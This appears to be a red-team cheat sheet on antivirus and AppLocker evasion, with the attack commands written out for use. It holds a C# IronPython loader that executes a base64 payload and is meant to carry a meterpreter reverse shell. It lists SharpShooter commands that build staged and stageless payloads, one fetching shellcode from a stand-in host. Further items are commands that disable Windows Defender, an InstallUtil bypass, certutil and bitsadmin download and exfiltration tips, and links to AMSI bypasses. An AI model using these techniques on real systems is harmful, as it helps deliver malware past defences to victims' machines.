# Anti Virus Bypass / Evasion   
## Contents
- [Anti Virus Bypass / Evasion](#anti-virus-bypass---evasion)
  * [Contents](#contents)
  * [Techniques](#techniques)
    + [Targeting Processes to Evade Detection](#targeting-processes-to-evade-detection)
    + [IronPython](#ironpython)
  * [Tools](#tools)
    + [Chamelon](#chamelon)
    + [Veil Framework:](#veil-framework-)
    + [Shellter](#shellter)
    + [Sharpshooter](#sharpshooter)
    + [Donut:](#donut-)
    + [Vulcan](#vulcan)
    + [Scarecrow](#scarecrow)
    + [Sharpshooter](#sharpshooter-1)
  * [Commands](#commands)
- [Living Off the Land](#living-off-the-land)
  * [Use Microsoft .NET InstallUtil to Evade AppLocker](#use-microsoft-net-installutil-to-evade-applocker)
- [Resources](#resources)
  * [Cheat sheets](#cheat-sheets)
  * [Workshops](#workshops)
  * [Windows Internal Resources](#windows-internal-resources)
  * [Tools](#tools-1)
  * [Further Reading](#further-reading)
  * [Videos](#videos)
  * [Process Injection](#process-injection)
  
## Techniques         
Modify malware to evade signature analysis, encode using obfuscation tools, leverage permitted tools (Living Off the Land)    
Use wrapper files to call static executables (such as nc)     
[AV Payloads](https://github.com/RoseSecurity/Anti-Virus-Evading-Payloads)     

### Targeting Processes to Evade Detection     
Process Injection, Process Hollowing, Process Masquerading     

### IronPython         
Execute obfuscated Python natively in a C# program, encode it as a variable then execute (no Python interpreter needed). Source: https://www.willhackforsushi.com/sec504/csharp_py.cs     
~~~
// This is the excellent work of Chris Davis of Counter Hack
// Small edits by Joshua Wright for clarity

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace csharp_py
{
    class Program
    {
        static void Main(string[] args)
        {
            // Create an IronPython engine to execute Python code
            Microsoft.Scripting.Hosting.ScriptEngine pythonEngine =
                IronPython.Hosting.Python.CreateEngine();

            // Print the default search paths
            // You may need to manually add these paths to include the DLLs necessary for execution
            System.Console.Out.WriteLine("Search paths:");
            ICollection<string> searchPaths = pythonEngine.GetSearchPaths();
            foreach (string path in searchPaths)
            {
                System.Console.Out.WriteLine(path);
            }
            System.Console.Out.WriteLine();

            // Now modify the search paths to include the directory
            // where the standard library has been installed
            searchPaths.Add(@"..\..\Lib");
            searchPaths.Add(@"..\Lib");
            searchPaths.Add(@".\Lib");
            pythonEngine.SetSearchPaths(searchPaths);

            // Execute the malicious Python coce
            // Replace the payload below with your own, possibly the output of msfvenom
            // msfvenom -p python/meterpreter/reverse_tcp LHOST=10.10.75.1
            Microsoft.Scripting.Hosting.ScriptSource pythonScript = pythonEngine.CreateScriptSourceFromString("exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('cAByAGkAbgB0ACgAJwByAGUAcABsAGEAYwBlACAAdABoAGkAcwAgAHAAcgBpAG4AdAAgAHMAdABhAHQAZQBtAGUAbgB0ACAAdwBpAHQAaAAgAHQAaABlACAAbQBzAGYAdgBlAG4AbwBtACAAcAB5AHQAaABvAG4AIABwAGEAeQBsAG8AYQBkACcAKQA=')[0]))");
            pythonScript.Execute();
        }
    }
}
~~~

## Tools     
### Chamelon    
[Chameleon](https://github.com/klezVirus/chameleon): Powershell script obfuscator  

### Veil Framework:

Install on Kali

    apt install veil
    /usr/share/veil/config/setup.sh --force --silent

Reference: https://github.com/Veil-Framework/Veil

### Shellter

Source: https://www.shellterproject.com/download/

    apt install shellter


### Sharpshooter

Javascript Payload Stageless: 

    SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

Stageless HTA Payload: 

    SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

Staged VBS:

    SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

Reference: https://github.com/mdsecactivebreach/SharpShooter

### Donut: 

Source: https://github.com/TheWover/donut

### Vulcan

Source: https://github.com/praetorian-code/vulcan


### Scarecrow

Source: https://github.com/optiv/ScareCrow

In Kali: 

    sudo apt install golang

    go get github.com/fatih/color
    go get github.com/yeka/zip
    go get github.com/josephspurrier/goversioninfo

    go build ScareCrow.go

    ./ScareCrow

### Sharpshooter
[SharpShooter](https://github.com/mdsecactivebreach/SharpShooter)   

Javascript Payload Stageless:   

    SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

Stageless HTA Payload: 

    SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

Staged VBS:

    SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4


## Commands 
Turning off Windows Defender 

    Set-MpPreference -DisableRealtimeMonitoring $true   

Need to run Powershell as admin and reboot after running command to turn off Windows Defender indefinetly: 

    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -name disableantispyware -value 1 -Force


View Windows Defender logs   

    Get-WinEvent 'Microsoft-Windows-Windows Defender/Operational' MaxEvents 10 | Where-Object Id -e 1116 | Format-List 


# Living Off the Land   
https://lolbas-project.github.io/    
Typical binaries used: Rundll32, Regsvr32, Msiexec, Mshta, Certutil, MSBuild, WMI command line utility (WMIC), WMI provider host (WmiPrvSe)      
Bitsadmin: exfil data   
Certutil: download data    

## Use Microsoft .NET InstallUtil to Evade AppLocker   
Execute code in program's local memory via reflection.    

    PS > InstallUtil /U mal.exe     #put malicious code in Uninstall routine of a program    

# Resources  
## Cheat sheets 
https://github.com/sinfulz/JustEvadeBro   
https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell      

## Workshops 
https://github.com/BC-SECURITY/Beginners-Guide-to-Obfuscation     

## Windows Internal Resources  
https://gist.github.com/vxcute/6f850da82578b3fe6a10b65496bb6ec8   

## Tools  
https://github.com/0xDivyanshu/Injector    
https://github.com/persianhydra/Xeexe-TopAntivirusEvasion   
https://github.com/hfiref0x/KDU    (Vulnerable driver for testing)   

## Further Reading 
https://offensivedefence.co.uk/posts/making-amsi-jump/   
https://i.blackhat.com/briefings/asia/2018/asia-18-Tal-Liberman-Documenting-the-Undocumented-The-Rise-and-Fall-of-AMSI.pdf   
https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell  
https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/amsi_patch_bin.nim  
https://blog.f-secure.com/hunting-for-amsi-bypasses/  
https://www.contextis.com/us/blog/amsi-bypass  
https://www.redteam.cafe/red-team/powershell/using-reflection-for-amsi-bypass  
https://amsi.fail/  
https://rastamouse.me/blog/asb-bypass-pt2/  
https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html  
https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/   
https://www.offensive-security.com/offsec/powershell-obfuscation/       
https://aptw.tf/2021/08/21/killing-defender.html  
https://roberreigada.github.io/posts/playing_with_an_edr/  
https://labs.f-secure.com/blog/bypassing-windows-defender-runtime-scanning/
https://depthsecurity.com/blog/obfuscating-malicious-macro-enabled-word-docs

## Videos 
https://www.youtube.com/watch?v=F_BvtXzH4a4  
https://www.youtube.com/watch?v=lP2KF7_Kwxk  
https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/  
https://www.youtube.com/watch?v=ZLAYdGxN0IQ    (Video series)   

## Process Injection  
https://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All-wp.pdf  

